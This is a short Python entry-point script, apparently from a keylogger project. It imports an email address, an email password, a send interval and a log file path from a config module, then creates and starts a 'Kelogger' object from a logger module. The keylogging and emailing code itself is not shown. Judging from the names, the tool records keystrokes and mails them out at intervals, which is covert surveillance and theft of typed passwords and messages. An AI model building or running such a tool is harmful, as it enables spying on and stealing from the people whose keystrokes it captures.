from config import EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_INTERVAL, LOG_FILE_PATH
from logger import Kelogger

#Main program
# create an object from a class Kelogger, Automatically, only __init__() is called.
my_Kelogger = Kelogger(SEND_INTERVAL, EMAIL_ADDRESS, EMAIL_PASSWORD, LOG_FILE_PATH)
# call a function inside the class
my_Kelogger.start()

